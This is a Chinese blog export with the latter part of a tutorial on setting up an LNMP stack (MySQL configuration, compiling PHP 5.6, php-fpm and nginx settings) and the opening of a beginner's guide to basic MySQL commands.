<h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设置目录权限</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;mysql</span><br><span class="line">chown -R root:mysql .   #把当前目录中所有文件的所有者所有者设为root，所属组为mysql</span><br><span class="line">chown -R mysql:mysql data</span><br><span class="line"></span><br><span class="line">复制配置文件</span><br><span class="line">cp support-files&#x2F;my-default.cnf &#x2F;etc&#x2F;my.cnf</span><br><span class="line"></span><br><span class="line">初始化mysql，开启ssl</span><br><span class="line">bin&#x2F;mysqld --initialize-insecure --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line">bin&#x2F;mysql_ssl_rsa_setup  --user&#x3D;mysql --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line"></span><br><span class="line">设置开机自启动</span><br><span class="line">cp &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysql</span><br><span class="line">chmod +x &#x2F;etc&#x2F;init.d&#x2F;mysql</span><br><span class="line">chkconfig --add mysql</span><br><span class="line">chkconfig mysql on</span><br><span class="line"></span><br><span class="line">修改配置文件</span><br><span class="line">vim &#x2F;etc&#x2F;my.cnf</span><br><span class="line">#配置文件里面可能没有这些参数，自己加就好，</span><br><span class="line">&gt;&gt;&gt;ll</span><br><span class="line">[mysqld]</span><br><span class="line">datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line">default-storage-engine&#x3D;MyISAM</span><br><span class="line"></span><br><span class="line">log-error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql_error.log	</span><br><span class="line">pid-file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql.pid</span><br><span class="line">user &#x3D; mysql</span><br><span class="line">tmpdir &#x3D; &#x2F;tmp</span><br><span class="line">&lt;&lt;&lt;</span><br><span class="line">#参数解释</span><br><span class="line">datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data &#x2F;&#x2F;数据库存放位置</span><br><span class="line">default-storage-engine&#x3D;MyISAM &#x2F;&#x2F;存储引擎</span><br><span class="line"></span><br><span class="line">log-error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql_error.log	&#x2F;&#x2F;错误日志写入的地方 </span><br><span class="line">pid-file &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;mysql.pid		&#x2F;&#x2F;启动mysql会挂载pid，pid是啥后面有介绍</span><br><span class="line">user &#x3D; mysql</span><br><span class="line">tmpdir &#x3D; &#x2F;tmp</span><br></pre></td></tr></table></figure>
<h1 id="5-PHP"><a href="#5-PHP" class="headerlink" title="5.PHP"></a>5.PHP</h1><h3 id="1-编译安装-1"><a href="#1-编译安装-1" class="headerlink" title="1.编译安装"></a>1.编译安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##一键安装</span><br><span class="line">yum -y install php72w php72w-cli php72w-common php72w-devel php72w-embedded php72w-fpm php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml</span><br><span class="line">#获取安装包</span><br><span class="line">wget http:&#x2F;&#x2F;120.52.51.15&#x2F;cn2.php.net&#x2F;distributions&#x2F;php-5.6.35.tar.gz</span><br><span class="line"></span><br><span class="line">#解压</span><br><span class="line">tar -zxvf php-5.6.35.tar.gz</span><br><span class="line"></span><br><span class="line">#进入目录</span><br><span class="line">cd php-5.6.35</span><br><span class="line"></span><br><span class="line">#创建用户</span><br><span class="line">groupadd nginx</span><br><span class="line">useradd -g nginx -s &#x2F;sbin&#x2F;nologin -M nginx</span><br><span class="line">#需要添加除root以外的用户来运行php-fpm，添加用户要与下面配置参数对应修改，不然配置完，再来修改容易出错且麻烦</span><br><span class="line"></span><br><span class="line">#建议先yum一下这两个库，先不弄也行，.&#x2F;configure之后报错再弄也行</span><br><span class="line">yum search readline</span><br><span class="line">yum install redline-devel.啥啥啥 &#x2F;&#x2F;search完后会有一些可安装包，找到devel和适合的版本</span><br><span class="line">yum search BZip2 </span><br><span class="line">yum install BZip2-devel.啥啥啥 &#x2F;&#x2F;一样的</span><br><span class="line"></span><br><span class="line"># 编译配置</span><br><span class="line">.&#x2F;configure \</span><br><span class="line">--prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php \</span><br><span class="line">--with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc \</span><br><span class="line">--enable-inline-optimization \</span><br><span class="line">--disable-debug \</span><br><span class="line">--disable-rpath \</span><br><span class="line">--enable-shared \</span><br><span class="line">--enable-opcache \</span><br><span class="line">--enable-fpm \</span><br><span class="line">--with-fpm-user&#x3D;nginx \</span><br><span class="line">--with-fpm-group&#x3D;nginx \</span><br><span class="line">--with-mysql&#x3D;mysqlnd \</span><br><span class="line">--with-mysqli&#x3D;mysqlnd \</span><br><span class="line">--with-pdo-mysql&#x3D;mysqlnd \</span><br><span class="line">--with-gettext \</span><br><span class="line">--enable-mbstring \</span><br><span class="line">--with-iconv \</span><br><span class="line">--with-mcrypt \</span><br><span class="line">--with-mhash \</span><br><span class="line">--with-openssl \</span><br><span class="line">--enable-bcmath \</span><br><span class="line">--enable-soap \</span><br><span class="line">--with-libxml-dir \</span><br><span class="line">--enable-pcntl \</span><br><span class="line">--enable-shmop \</span><br><span class="line">--enable-sysvmsg \</span><br><span class="line">--enable-sysvsem \</span><br><span class="line">--enable-sysvshm \</span><br><span class="line">--enable-sockets \</span><br><span class="line">--with-curl \</span><br><span class="line">--with-zlib \</span><br><span class="line">--enable-zip \</span><br><span class="line">--with-bz2 \</span><br><span class="line">--with-readline</span><br><span class="line"></span><br><span class="line">##参数解释</span><br><span class="line"># 安装目录</span><br><span class="line">--prefix</span><br><span class="line"># 配置文件php.ini位置</span><br><span class="line">--with-config-file-path</span><br><span class="line"># 优化选项</span><br><span class="line">--enable-inline-optimization</span><br><span class="line">--disable-debug</span><br><span class="line">--disable-rpath</span><br><span class="line">--enable-shared</span><br><span class="line"># 启用opcache</span><br><span class="line">--enable-opcache</span><br><span class="line"># 配置php-fpm</span><br><span class="line">--enable-fpm</span><br><span class="line">--with-fpm-user</span><br><span class="line">--with-fpm-group</span><br><span class="line"># 配置MySQL</span><br><span class="line">--with-mysql</span><br><span class="line">--with-mysqli</span><br><span class="line">--with-pdo-mysql</span><br><span class="line"># 国际化与字符编码支持</span><br><span class="line">--with-gettext</span><br><span class="line">--enable-mbstring</span><br><span class="line">--with-iconv</span><br><span class="line"># 加密</span><br><span class="line">--with-mcrypt</span><br><span class="line">--with-mhash</span><br><span class="line">--with-openssl</span><br><span class="line"># 数学扩展</span><br><span class="line">--enable-bcmath</span><br><span class="line">#  Web 服务，soap 依赖 libxml</span><br><span class="line">--enable-soap</span><br><span class="line">--with-libxml-dir</span><br><span class="line"># 进程，信号及内存</span><br><span class="line">--enable-pcntl</span><br><span class="line">--enable-shmop</span><br><span class="line">--enable-sysvmsg</span><br><span class="line">--enable-sysvsem</span><br><span class="line">--enable-sysvshm</span><br><span class="line"># socket &amp; curl</span><br><span class="line">--enable-sockets</span><br><span class="line">--with-curl</span><br><span class="line"># 压缩与归档</span><br><span class="line">--with-zlib</span><br><span class="line">--enable-zip</span><br><span class="line">--with-bz2</span><br><span class="line"># GNU Readline 命令行快捷键绑定</span><br><span class="line">--with-readline</span><br><span class="line"></span><br><span class="line"># 如果提示ERROR缺了啥依赖包，需要安装</span><br><span class="line"># 反正报啥错就增加啥，理论上是都添加好了</span><br><span class="line">##添加依赖包</span><br><span class="line">#如果报错添加以下命令</span><br><span class="line">#yum install libxml2-devel bzip2-devel libcurl-devel libmcrypt-devel readline-devel</span><br><span class="line"></span><br><span class="line">编译安装</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<h3 id="2-配置-1"><a href="#2-配置-1" class="headerlink" title="2.配置"></a>2.配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#复制配置文件(安装包位置&#x2F;usr&#x2F;lcoal&#x2F;downloads&#x2F;php-5.6.0)</span><br><span class="line"></span><br><span class="line">1.php配置文件php.ini</span><br><span class="line">updatedb	#更新locate数据库，存储了位置</span><br><span class="line">locate php.ini</span><br><span class="line"># 安装包内的php.ini配置文件有两个：</span><br><span class="line">## 1.php.ini-production 安全性较高，一般用于生产</span><br><span class="line">## 2.php.ini-development 一般用于开发</span><br><span class="line"># 因为第二个比第一个显示的错误信息更多会暴露用户一些信息，</span><br><span class="line"># 所以一般产品要正式使用的话建议用production，要用哪个就复制哪个为php.ini</span><br><span class="line">cp &#x2F;刚刚的路径&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php56&#x2F;etc&#x2F;php.ini </span><br><span class="line"></span><br><span class="line">2.php-fpm配置文件php-fpm.conf</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;php56&#x2F;etc</span><br><span class="line">cp php-fpm.conf.default php-fpm.conf</span><br><span class="line"></span><br><span class="line">3.复制启动脚本</span><br><span class="line">cd &#x2F;downloads&#x2F;php-5.6.30&#x2F;sapi&#x2F;fpm</span><br><span class="line">cp init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpm</span><br><span class="line">chmod +x &#x2F;etc&#x2F;init.d&#x2F;php-fpm</span><br><span class="line"></span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;php56&#x2F;sbin&#x2F;php-fpm &#x2F;usr&#x2F;local&#x2F;bin</span><br><span class="line">#快捷命令</span><br><span class="line">4.设置php-fpm开机自启动</span><br><span class="line">chkconfig --add php-fpm</span><br><span class="line">chkconfig php-fpm on</span><br></pre></td></tr></table></figure>
<h3 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3.修改配置文件"></a>3.修改配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate php-fpm.conf</span><br><span class="line">#vim ....文件路径</span><br><span class="line">##配置文件</span><br><span class="line">;include&#x3D;etc&#x2F;fpm.d&#x2F;*.conf</span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Global Options ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;</span><br><span class="line">[global]</span><br><span class="line">;prefix 应用根目录在&#x2F;usr&#x2F;local&#x2F;php56</span><br><span class="line">;Pid文件 :默认var&#x2F;run&#x2F;php-rpm.pid</span><br><span class="line">pid &#x3D; run&#x2F;php-fpm.pid</span><br><span class="line"></span><br><span class="line">; 错误日志 :默认在var&#x2F;log&#x2F;php-fpm.log</span><br><span class="line">error_log &#x3D; log&#x2F;php-fpm.log</span><br><span class="line"></span><br><span class="line">; 写入错误日志的级别：alert, error, warning, notice(默认), debug</span><br><span class="line">log_level &#x3D; error</span><br><span class="line"></span><br><span class="line">; 表示在emergency_restart_interval所设值内出现SIGSEGV或者SIGBUS错误的php-cgi进程数</span><br><span class="line">; 如果超过 emergency_restart_threshold个，php-fpm就会优雅重启。这两个默认值都是0</span><br><span class="line">emergency_restart_threshold &#x3D; 60</span><br><span class="line">;单位可以是s(econd)(默认),m(minutes),h(hours),d(ays)</span><br><span class="line">emergency_restart_interval &#x3D; 60</span><br><span class="line"></span><br><span class="line">; 限制子进程接受主进程复用信号的超时时间(默认是0s)</span><br><span class="line">; 单位: s(econds)(默认单位), m(inutes), h(ours), or d(ays)</span><br><span class="line">process_control_timeout &#x3D; 0</span><br><span class="line"></span><br><span class="line">; 最大进程数</span><br><span class="line">; process.max &#x3D; 128</span><br><span class="line"></span><br><span class="line">; 主进程的优先级，由高到低是-19~20</span><br><span class="line">; process.priority &#x3D; -19</span><br><span class="line"></span><br><span class="line">; 后台执行fpm,默认值为yes，</span><br><span class="line">; 如果为了调试可以改为no。</span><br><span class="line">; 在FPM中，可以使用不同的设置来运行多个进程池。</span><br><span class="line">; 这些设置可以针对每个进程池单独设置。</span><br><span class="line">daemonize &#x3D; yes</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Pool Definitions ; </span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">[www]</span><br><span class="line"></span><br><span class="line">; Per pool prefix</span><br><span class="line">; It only applies on the following directives:</span><br><span class="line">; - &#39;access.log&#39;</span><br><span class="line">; - &#39;slowlog&#39;</span><br><span class="line">; - &#39;listen&#39; (unixsocket)</span><br><span class="line">; - &#39;chroot&#39;</span><br><span class="line">; - &#39;chdir&#39;</span><br><span class="line">; - &#39;php_values&#39;</span><br><span class="line">; - &#39;php_admin_values&#39;</span><br><span class="line">;prefix &#x3D; &#x2F;path&#x2F;to&#x2F;pools&#x2F;$pool</span><br><span class="line"></span><br><span class="line">; 启动进程的账户和组</span><br><span class="line">user &#x3D; nginx</span><br><span class="line">group &#x3D; nginx</span><br><span class="line"></span><br><span class="line">; fpm监听端口，即nginx中php处理的地址，一般默认值即可。</span><br><span class="line">; 常用格式有 &#39;ip:port&#39;、&#39;port&#39;、&#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39;</span><br><span class="line">listen &#x3D; 127.0.0.1:9000</span><br><span class="line"></span><br><span class="line">; backlog数，-1表示无限制，由操作系统决定，此行注释掉就行。</span><br><span class="line">;listen.backlog &#x3D; 65535</span><br><span class="line"></span><br><span class="line">; unix socket设置选项，如果使用tcp方式访问，这里注释即可。</span><br><span class="line">listen.owner &#x3D; nginx</span><br><span class="line">listen.group &#x3D; nginx</span><br><span class="line">listen.mode &#x3D; 0660</span><br><span class="line">;listen.acl_users &#x3D;</span><br><span class="line">;listen.acl_groups &#x3D;</span><br><span class="line"> </span><br><span class="line">;listen.allowed_clients &#x3D; 127.0.0.1</span><br><span class="line"></span><br><span class="line">; process.priority &#x3D; -19</span><br><span class="line"></span><br><span class="line">; 如何控制子进程 对于专用服务器，pm可以设置为static</span><br><span class="line">; Possible Values:</span><br><span class="line">;   static  - a fixed number (pm.max_children) of child processes;</span><br><span class="line">;   dynamic - the number of child processes are set dynamically based on the</span><br><span class="line">;             following directives. With this process management, there will be</span><br><span class="line">;             always at least 1 children.</span><br><span class="line">;             pm.max_children      - 子进程最大数</span><br><span class="line">;             pm.start_servers     - 启动时的进程数</span><br><span class="line">;             pm.min_spare_servers - 保证空闲进程数最小值，如果空闲进程小于此值，则创建新的子进程</span><br><span class="line">;             pm.max_spare_servers - 保证空闲进程数最大值，如果空闲进程大于此值，此进行清理</span><br><span class="line">;  ondemand - no children are created at startup. Children will be forked when</span><br><span class="line">;             new requests will connect. The following parameter are used:</span><br><span class="line">;             pm.max_children           - the maximum number of children that</span><br><span class="line">;                                         can be alive at the same time.</span><br><span class="line">;             pm.process_idle_timeout   - The number of seconds after which</span><br><span class="line">;                                         an idle process will be killed.</span><br><span class="line">; Note: This value is mandatory.</span><br><span class="line">pm &#x3D; dynamic</span><br><span class="line"></span><br><span class="line">pm.max_children &#x3D; 5</span><br><span class="line">pm.start_servers &#x3D; 2</span><br><span class="line">pm.min_spare_servers &#x3D; 1</span><br><span class="line">pm.max_spare_servers &#x3D; 3</span><br><span class="line"></span><br><span class="line">;pm.process_idle_timeout &#x3D; 10s; </span><br><span class="line">; 设置每个子进程重生之前服务的请求数. </span><br><span class="line">; 对于可能存在内存泄漏的第三方模块来说是非常有用的. </span><br><span class="line">; 如果设置为 &#39;0&#39; 则一直接受请求, 等同于 PHP_FCGI_MAX_REQUESTS 环境变量. </span><br><span class="line">; 默认值: 0</span><br><span class="line">pm.max_requests &#x3D; 500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; FPM状态页面的网址. 如果没有设置, 则无法访问状态页面. 默认值: none. munin监控会使用到</span><br><span class="line">pm.status_path &#x3D; &#x2F;status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; ;FPM监控页面的ping网址. </span><br><span class="line">; 如果没有设置, 则无法访问ping页面. </span><br><span class="line">; 该页面用于外部检测FPM是否存活并且可以响应请求. </span><br><span class="line">; 请注意必须以斜线开头 (&#x2F;)。</span><br><span class="line">ping.path &#x3D; &#x2F;ping</span><br><span class="line"></span><br><span class="line">; 用于定义ping请求的返回响应. </span><br><span class="line">; 返回为 HTTP 200 的 text&#x2F;plain 格式文本. </span><br><span class="line">; 默认值: pong.</span><br><span class="line">;ping.response &#x3D; pong</span><br><span class="line"></span><br><span class="line">; 登录 log</span><br><span class="line">access.log &#x3D; log&#x2F;$pool.access.log</span><br><span class="line"></span><br><span class="line">; accessLog格式</span><br><span class="line">; Default: &quot;%R - %u %t \&quot;%m %r\&quot; %s&quot;</span><br><span class="line">access.format &#x3D; &quot;%R - %u %t \&quot;%m %r%Q%q\&quot; %s %f %&#123;mili&#125;d %&#123;kilo&#125;M %C%%&quot;</span><br><span class="line"> </span><br><span class="line">;慢请求的记录日志</span><br><span class="line">;配合request_slowlog_timeout使用</span><br><span class="line">slowlog &#x3D; log&#x2F;$pool.log.slow</span><br><span class="line"> </span><br><span class="line">;当一个请求该设置的超时时间后</span><br><span class="line">;就会将对应的PHP调用堆栈信息完整写入到慢日志中.</span><br><span class="line">;设置为 &#39;0&#39; 表示 &#39;Off&#39;</span><br><span class="line">request_slowlog_timeout &#x3D; 0</span><br><span class="line"> </span><br><span class="line">; 设置单个请求的超时中止时间. </span><br><span class="line">; 该选项可能会对php.ini设置中的&#39;max_execution_time&#39;因为某些特殊原因没有中止运行的脚本有用.</span><br><span class="line">; 设置为 &#39;0&#39; 表示 &#39;Off&#39;.</span><br><span class="line">; 当经常出现502错误时可以尝试更改此选项。</span><br><span class="line">request_terminate_timeout &#x3D; 0</span><br><span class="line"> </span><br><span class="line">; 设置文件打开描述符的rlimit限制. </span><br><span class="line">; 默认值: 系统定义值默认可打开句柄是1024，</span><br><span class="line">; 可使用 ulimit -n查看，ulimit -n 2048修改。</span><br><span class="line">rlimit_files &#x3D; 1024</span><br><span class="line"> </span><br><span class="line">; 设置核心rlimit最大限制值. 可用值: &#39;unlimited&#39; 、0或者正整数. 默认值: 系统定义值.</span><br><span class="line">;rlimit_core &#x3D; 0</span><br><span class="line"> </span><br><span class="line">; 启动时的Chroot目录. 所定义的目录需要是绝对路径. 如果没有设置, 则chroot不被使用.</span><br><span class="line">;chroot &#x3D; </span><br><span class="line"> </span><br><span class="line">; 设置启动目录，启动时会自动Chdir到该目录. </span><br><span class="line">; 所定义的目录需要是绝对路径. </span><br><span class="line">; 默认值: 当前目录，或者&#x2F;目录（chroot时）</span><br><span class="line">;chdir &#x3D; &#x2F;var&#x2F;www</span><br><span class="line"> </span><br><span class="line">; 重定向运行过程中的stdout和stderr到主要的错误日志文件中. </span><br><span class="line">; 如果没有设置, stdout 和 stderr 将会根据FastCGI的规则被重定向到 &#x2F;dev&#x2F;null . </span><br><span class="line">; 默认值: 空.</span><br><span class="line">;catch_workers_output &#x3D; yes</span><br><span class="line"></span><br><span class="line">;clear_env &#x3D; no</span><br><span class="line"></span><br><span class="line">;security.limit_extensions &#x3D; .php .php3 .php4 .php5</span><br></pre></td></tr></table></figure>
<p><strong>配置文件中文翻译</strong></p>
<p>[github][<a href="https://github.com/HeDefine/PHP.ini-for-Chinese/tree/master]">https://github.com/HeDefine/PHP.ini-for-Chinese/tree/master]</a></p>
<h1 id="6-配置nginx支持php"><a href="#6-配置nginx支持php" class="headerlink" title="6.配置nginx支持php"></a>6.配置nginx支持php</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate nginx.conf</span><br><span class="line">vim ..文件路径</span><br><span class="line"></span><br><span class="line">#将文件第45行修改为如下内容</span><br><span class="line">index index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">#文件的65-72行代码前的注释“＃”去掉,并替换&quot;root&quot;和“fastcgi_param”参数值也就是，使用&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html作为网站根目录</span><br><span class="line"></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">       root           &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html;</span><br><span class="line">       fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">       fastcgi_index  index.php;</span><br><span class="line">       fastcgi_param  SCRIPT_FILENAME &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html$fastcgi_script_name;</span><br><span class="line">           include        fastcgi_params;</span><br><span class="line">       &#125;</span><br><span class="line">locate php.ini</span><br><span class="line">vim ..文件路径</span><br><span class="line">#在结尾的“；Local Variables：”之前添加如下内容</span><br><span class="line">cgi.fix_pathinfo &#x3D; 1</span><br><span class="line"></span><br><span class="line">killall -9 php-fpm</span><br><span class="line">killall -9 nginx</span><br><span class="line">nginx</span><br><span class="line">php-fpm</span><br><span class="line">#重启(不会写脚本)</span><br><span class="line">netstat -ntlp #查看端口是否启用并被php-fpm以及nginx使用</span><br></pre></td></tr></table></figure>
<h1 id="7-查看LNMP网站环境"><a href="#7-查看LNMP网站环境" class="headerlink" title="7.查看LNMP网站环境"></a>7.查看LNMP网站环境</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;lcoal&#x2F;nginx&#x2F;html</span><br><span class="line">touch info.php</span><br><span class="line">vim info.php</span><br><span class="line">#加入下面内容</span><br><span class="line">&lt;?php</span><br><span class="line">  phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">#写入退出</span><br><span class="line">ECS</span><br><span class="line">:wq</span><br><span class="line"></span><br><span class="line">#访问http:&#x2F;&#x2F;ip&#x2F;info.php</span><br><span class="line">#测试是否解析php，若成功，则配置完成</span><br></pre></td></tr></table></figure>
<h1 id="8-常见问题"><a href="#8-常见问题" class="headerlink" title="8.常见问题"></a>8.常见问题</h1><p><strong>访问不到网站?</strong></p>
<p>检查防火墙配置并ping服务器IP、telnet服务器80端口测试连通性</p>
<p><strong>能访问到html文件却访问不到php文件?</strong></p>
<p>安装php和配置nginx支持php的步骤是否正确。</p>
<p>//FILE FAILD FIND 是由于nginx配置没有配好</p>
<p>//所有结束后，删除info.php</p>
<h1 id="9-参考文献"><a href="#9-参考文献" class="headerlink" title="9.参考文献"></a>9.参考文献</h1><p>[手动配置LNMP][<a href="https://www.jianshu.com/p/292514f97944]">https://www.jianshu.com/p/292514f97944]</a></p>
<p>[阿里云开放实验室][<a href="https://edu.aliyun.com/lab/courses/14107e607fe742a88a60d1148d7b405c/detail?purchaseRecordId=4eddcaf58df543d9b96af97a5b2d9342%5D">https://edu.aliyun.com/lab/courses/14107e607fe742a88a60d1148d7b405c/detail?purchaseRecordId=4eddcaf58df543d9b96af97a5b2d9342]</a></p>
<h1 id="0-扩展"><a href="#0-扩展" class="headerlink" title="0.扩展"></a>0.扩展</h1><p>[Nginx - 维基百科][<a href="https://zh.wikipedia.org/wiki/Nginx]">https://zh.wikipedia.org/wiki/Nginx]</a></p>
<p>[8分钟带你深入浅出搞懂Nginx][<a href="https://zhuanlan.zhihu.com/p/34943332]">https://zhuanlan.zhihu.com/p/34943332]</a></p>
<p>[PHPMyadmin 配置文件详解(配置)][<a href="https://www.jb51.net/article/21228.html]">https://www.jb51.net/article/21228.html]</a></p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql数据库</title>
    <url>/2019/05/20/Note/%E8%AE%B2%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h1 id="Mysql数据库"><a href="#Mysql数据库" class="headerlink" title="Mysql数据库"></a>Mysql数据库</h1><h4 id="1-熟悉基本的linux下的命令行，运用他们。"><a href="#1-熟悉基本的linux下的命令行，运用他们。" class="headerlink" title="1.熟悉基本的linux下的命令行，运用他们。"></a>1.熟悉基本的linux下的命令行，运用他们。</h4><a id="more"></a>

<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>了解一些名词。（菜鸟教程上解释的很清楚）</p>
<ul>
<li><strong>数据库:</strong> 数据库是一些关联表的集合。</li>
<li><strong>数据表:</strong> 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。</li>
<li><strong>列:</strong> 一列(数据元素) 包含了相同的数据, 例如邮政编码的数据。</li>
<li><strong>行：</strong>一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。</li>
<li><strong>冗余</strong>：存储两倍数据，冗余降低了性能，但提高了数据的安全性。</li>
<li><strong>主键</strong>：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。</li>
<li><strong>外键：</strong>外键用于关联两个表。</li>
<li><strong>复合键</strong>：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。</li>
<li><strong>索引：</strong>使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。</li>
<li><strong>参照完整性:</strong> 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性</li>
<li><strong>表头(header)</strong>: 每一列的名称;</li>
<li><strong>列(col):</strong> 具有相同数据类型的数据的集合;</li>
<li><strong>行(row):</strong> 每一行用来描述某条记录的具体信息;</li>
<li><strong>值(value):</strong> 行的具体信息, 每个值必须与该列的数据类型相同;</li>
<li><strong>键(key)</strong>: 键的值在当前列中具有唯一性</li>
</ul>
<p><strong>退出</strong></p>
<p><strong>exit</strong> 或 <strong>quit</strong>。</p>
<h4 id="1-mysql"><a href="#1-mysql" class="headerlink" title="1.mysql"></a><strong>1.mysql</strong></h4><p>MySQL基础知识<br>MySQL经常和“数据库”连在一起读，这很容易对新手造成误解，认为MySQL就是一个数据库</p>
<p>其实不是这样，MySQL是数据库的集合，MySQL里面有很多数据库</p>
<p>那么数据是直接存在数据库里的吗？并不，数据库底下还有一个叫做数据表的存储单元</p>
<p>数据表里面才存储数据。</p>
<p>打个比方，好比一座大图书馆，就是MySQL，图书馆里面分南库，北库，这就是数据库，</p>
<p>每个库里面的书都是放在书架上的，书架就是数据表，而放在书架上的很多本书，就是数据</p>
<p>。这么说，读者应该理解了吧，所以按大小顺序排个序就应该是，</p>
<p><strong>MySQL&gt;数据库&gt;数据表&gt;数据</strong>，所以我们接下来的内容也是按照这个顺序来展开。（把黑体理解就好）</p>
<p>前面跟着颜老板把那个环境安装好了，然后就可以使用mysql了。首先打开xshell，</p>
<h5 id="1-进入你的mysql"><a href="#1-进入你的mysql" class="headerlink" title="1.进入你的mysql"></a>1.进入你的mysql</h5><p><strong>mysql -u root -p</strong> #然后[root@<strong><em>*</em>*</strong> ~]后面输入</p>
<p>-u 是指user用户名，</p>
<p>root是你创建了一个root用户，最高管理员进入。</p>
<p>-p是要你输入你的mysql密码。</p>
<p>#回车Enter password: 然后输入你的密码</p>
<p>#（这里你输入的时候是看不见的，linux是有这个保护，以免泄密，windows系统下一般不会</p>
<p>有这个。输入后然后回车。）</p>
<p>讲解root为什么，这是管理员登录，可以进行好多操作，增删改查。</p>
<p>你也可以创建一个用户不是root。然后给他权限，进行登录。具体可以参照</p>
<p>（菜鸟教程/数据库/mysql/mysql管理），</p>
<p>就有这个出现，有的版本不一样，但是大致是一样的。</p>
<p>Welcome to the MySQL monitor. Commands end with ; or \g.<br>Your MySQL connection id is 2<br>Server version: 5.7.25-log MySQL Community Server (GPL)</p>
<p>Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights</p>
<p>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.</p>
<p>Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current inpu.</p>
<p>MySQL [(none)] &gt;</p>
<p>MySQL [(none)] &gt;这个none是你还没有选择数据库。有的版本有有的没有。</p>
<p>选择了数据库就是MySQL [(xx)] &gt;.</p>
<h5 id="2-展示你的数据库"><a href="#2-展示你的数据库" class="headerlink" title="2.展示你的数据库"></a>2.展示你的数据库</h5><p><strong>show databases;</strong> #因为你不知道你刚开始有多少的数据库，所以是databases</p>
<p><strong>而且一定要记住，输入；</strong>因为之前配环境的时候的语句没有后面加;的习惯，所以菜鸡本鸡刚开始的时候就常常忘记加；导致它以为我还有东西要输入，另起一行。</p>
<p>出现这四个初始数据库</p>
<p>+——————–+<br>| Database |<br>+——————- -+<br>| information_schema |<br>| mysql |<br>| performance_schema |<br>| sys |<br>+——————–+</p>
<h5 id="3-创建你的数据库"><a href="#3-创建你的数据库" class="headerlink" title="3.创建你的数据库"></a>3.创建你的数据库</h5><p><strong>create database XX;</strong> (XX是数据库名)这个数据库名你可以随便取，但是不能取一些关键字，例如create show类似的</p>
<p>输入后回车然后看见</p>
<p><strong>Query OK,1 row affected (0.00 sec)</strong> #表示创建数据库成功。</p>
<p>在这里给大家补充一点，创建数据库的时候，默认的字符是”latin“，也就是拉丁文，现在可能体会不到有什么区别，到数据表的操作的时候就有区别了。</p>
<p>不过这里还是告诉大家，如何创建数据库的时候，自己定义为什么字符</p>
<p><strong>create database XX(数据库名) charset = (字符编码，例如utf8);</strong></p>
<p>#我们平时学的中文的字符编码是“utf-8”，但是在MySQL里面，中文字符编码是“utf8”，这点需要注意。</p>
<p>还有一点，要是你创建一个已经存在的数据库会报错。例如：</p>
<p><strong>create database test;</strong></p>
<p>会提示以下信息</p>
<p><strong>can’t create database ‘test’ ;database exists</strong></p>
<p>所以我们在创建数据库的时候最好判断一下子，你要创建的数据库到底存不存在。</p>
